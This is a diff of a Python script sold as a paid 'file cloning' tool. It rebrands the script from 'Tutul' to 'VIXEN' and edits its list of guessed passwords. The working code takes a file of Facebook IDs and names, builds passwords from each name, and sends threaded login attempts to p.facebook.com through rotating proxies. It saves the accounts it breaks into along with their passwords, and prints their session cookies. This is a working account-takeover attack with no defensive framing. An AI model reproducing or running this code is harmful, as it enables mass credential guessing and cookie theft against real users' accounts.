@@ -1,5 +1,5 @@
 #tanjid_bai
-#bypss Tutul by TANJID VAI
+#bypss VIXEN by TANJID VAI
 import os 
 #os.system("pkg install sox -y")
 #os.system("play op.mp3")
@@ -37,7 +37,7 @@ try:
 	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mVIXEN')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -103,7 +103,7 @@ cokbrut=[]
 
 def back():
 	login()
-Tutul="Tutul"
+VIXEN="VIXEN"
 imt="SETU"
 ak="CLASS3-"
 
@@ -121,7 +121,7 @@ x = '\33[m' # DEFAULT
 m = '\x1b[1;91m' #RED +
 k = '\033[93m' # KUNING +
 h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
+hh = '\033[32m' # GREEN
 u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
@@ -140,7 +140,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def TUTULj(u):
+def VIXENj(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
 	os.system('clear')
@@ -155,7 +155,7 @@ attemps = 0
 #    username = input(' \033[0;92mEnter Username: ')
   #  password = input(' \033[0;93mEnter Password: ')
 
- #   if username == 'Tutul' and password == 'Love':
+ #   if username == 'VIXEN' and password == 'Love':
     #    print(' \033[0;92mYou Have Successfully Logged in.')
     #    break
   #  else:
@@ -165,43 +165,48 @@ attemps = 0
 os.system('clear')
 #------------------[ MAIN ]-----------------#
 
-os.system('espeak -a 300 " ENTER YOUR NAME,"')
+os.system('espeak -a 300 " Your,   Real,  Name,"')
 NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  VIXEN 444,  Tools"')
-os.system('xdg-open https://www.facebook.com/roshan.thokar.393 ')
+os.system('espeak -a 300 " Welcome,   to,  VIXEN,  King,  Tools"')
+os.system('xdg-open https://www.facebook.com/roshan.thokar.686.Ok.Bro')
 def banner():
 	os.system("clear")
 	print (f"""
-__     _____  _______ _   _     _  _     _  _     _  _ 
-\ \   / (_\ \/ |____ | | / |   | || |   | || |   | || |
- \ \ / /| |\  /  |_  | |/  |  _| || |  _| || |  _| || |
-  \ V / | |/  \ ___| |  /| | |_   __| |_   __| |_   __|
-   \_/  |_/_/\_|_____|_/ |_|   |_|      |_|      |_|   
+
+\033[32m██    ██ ██ ██   ██ ███████ ███    ██ 
+\033[32m██    ██ ██  ██ ██  ██      ████   ██ 
+\033[32m██    ██ ██   ███   █████   ██ ██  ██ 
+\033[32m ██  ██  ██  ██ ██  ██      ██  ██ ██ 
+\033[32m  ████   ██ ██   ██ ███████ ██   ████ 
+                                      
+                                      
+
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;41m        [ MOBILE DATA AND WI-FI WORKING ]         \033[0;92m║
+║\33[0;41m        [ WORKING DATA AND WI-FI ]         \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mVIXEN 444 ]\33[1;38m     ║\033[1;31m 
-╠══[Facebook                 • VIXEN 444 ]   ║  \033[1;97m  
-╠══[Github                   • \33[1;38mRoshanDona ]   ║\33[1;34m   
-╠══[Whatsapp                 • 9779810185387 ]  ║\33[1;35m 
-╠══[TOOLS                    • PAID  ]        ║ \33[1;32m   
-╠══[VERSION                  • 0.7.1 ]          ║\033[1;35m 
+╠══[Author                   • \33[1;38mVIXEN
+╠══[Facebook                 • Roshan T. Tamang
+╠══[Github                   • \33[1;38mRoshanDona
+╠══[Whatsapp                 • 9810185387
+╠══[TOOLS                    • Paid
+╠══[VERSION                  • 0.7.1
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 def login():
 	banner()
-	TUTULj('[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	TUTULj('===============================================')
-	TUTUL= input('[+] CHOOSE: ');time.sleep(0.01)
-	if TUTUL in ['m']:
+	VIXENj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	VIXENj('\033[0;97m===============================================')
+	VIXEN= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if VIXEN in ['m']:
 		public()
-	elif TUTUL in ['1']:
+	elif VIXEN in ['1']:
 		crack_file()
-	elif TUTUL in ['i','0i']:
+	elif VIXEN in ['i','0i']:
 		result()
-	elif TUTUL in ['2','02']:
+	elif VIXEN in ['2','02']:
 		os.system('xdg-open https://wa.me/+9779810185387')
-	elif TUTUL in ['0']:
+	elif VIXEN in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('#DONE LOGOUT ')
@@ -365,7 +370,7 @@ def crack_file():
 	os.system('clear')
 	banner()
 	os.system('espeak -a 300 " your file name"')
-	print('\033[1;32m[ Put File Example:  /sdcard/vixen.txt  Etc...]')
+	print('\033[1;32m[ Put File Example:  /sdcard/VIXEN.txt  Etc...]')
 	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
 	print('')
 	try:lin = open(o).read().splitlines()
@@ -399,8 +404,8 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m LOGIN \n\x1b[1;97m [1] METHOD BEST ')
-	os.system('espeak -a 300 " 1,  best method"')
+	print('\x1b[1;92m LOGIN SEXY\n\x1b[1;97m [1] METHOD BEST ')
+	os.system('espeak -a 300 " 1,  method,  Sex"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -418,7 +423,7 @@ def passwrd():
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	TUTULj(f'\033[0;97m===============================================')
+	VIXENj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -428,23 +433,18 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(nmf)
-					pwv.append(frs+'lst')
-					pwv.append(frs+'12')
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@321')
 					pwv.append(frs+'@1234')
-					pwv.append(frs+'@12345')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'12345')
-					pwv.append(frs+'12@@')
-					pwv.append(frs+'12@@@')
-					pwv.append(frs+'123@@')
-					pwv.append(frs+'123@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'321')
+					pwv.append(frs+'12')
 					
 					
 			else:
@@ -458,25 +458,25 @@ def passwrd():
 					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@@321')
+					pwv.append(frs+'@1234')
 					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
+					pwv.append(frs+'321')
 					pwv.append(frs+'12')
 					
 					
 					
 				pool.submit(crack,idf,pwv)
 	print('')
-	TUTULj('==========================================')
-	TUTULj('CLONING COMPLETE .......... ')
+	VIXENj('==========================================')
+	VIXENj('CLONING COMPLETE .......... ')
 	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[Tutul-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[VIXEN-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -493,8 +493,8 @@ def crack(idf,pwv):
 			heade={"Host":'p.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				#Tutul-King
-				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')     
+				#VIXEN-King
+				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•VIXEN-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -504,10 +504,10 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#Tutul-King
-				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Tutul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+				#VIXEN-King
+				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•VIXEN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
-				os.system('espeak -a 300 " vixen,  Ok,  id"')
+				os.system('espeak -a 300 " VIXEN,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
 				cek_apk(session,coki)
 				break
